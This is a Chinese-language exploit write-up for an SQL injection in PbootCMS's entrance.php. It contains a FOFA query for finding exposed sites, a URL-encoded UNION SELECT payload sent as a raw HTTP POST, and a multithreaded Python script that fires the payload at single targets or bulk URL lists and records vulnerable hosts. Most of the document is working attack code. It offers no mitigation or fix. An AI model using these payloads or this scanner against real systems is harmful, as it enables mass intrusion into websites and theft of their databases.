# 漏洞描述
由于PbootCMS entrance.php 文件代码逻辑缺陷存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

# 漏洞来源
[https://github.com/wy876/wiki/blob/main/PbootCMS/PbootCMS%E6%8E%A5%E5%8F%A3entrance.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md](https://github.com/wy876/wiki/blob/main/PbootCMS/PbootCMS%E6%8E%A5%E5%8F%A3entrance.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)

# fofa
header="PbootCMS" || body="zbeol.com"

# 漏洞复现

poc

```http
POST /?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%64%61%74%61%62%61%73%65%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


# py脚本
```python
#coding:utf-8
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib.parse

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

timeout = 5  # 请求超时时间

def verify(url, proxies={}):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    if not url.startswith(('http://', 'https://')):
        # 如果没有，就添加 'http://'
        url = 'http://' + url
    # data = ''' '''
    vulurl = url + '/?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%64%61%74%61%62%61%73%65%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d'
    try:
        r = requests.post(vulurl, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=timeout)
        if r.status_code == 200 and r.text:
            pattern = r'''<a\s?href="\/\?tag\/}sql:\s*(\S*)\/">'''
            match = re.findall(pattern, r.text)
            if match:
                print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                with open('PbootCMS sql.txt', 'a') as f:
                    f.write(url + '\n')
        else:
            print("[-] No vulnerabilities found")
    except requests.exceptions.RequestException as e:
        print(e)

def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        return urls
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")
        return []

def help():
    # helpinfo = """ """
    # print(helpinfo)
    print("PbootCMS接口entrance.php存在SQL注入漏洞".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -p --proxies 代理设置")
    print(f"[+]{sys.argv[0]} -t --thread 线程设置，默认为10")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies={})
    elif args.file:
        urls = pl(args.file)
        if not urls:
            print(f"[-] No valid URLs found in {args.file}")
            return

        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            # 使用 executor.map 实现并发调用
            results = list(executor.map(lambda url: verify(url, proxies={}), urls))
            # 可选：打印结果
            # for result in results:
            #     if result and result.get('isVul'):
            #         print(f"[+] Vulnerability confirmed for {result['url']}")
    else:
        help()

if __name__ == '__main__':
    main()
```



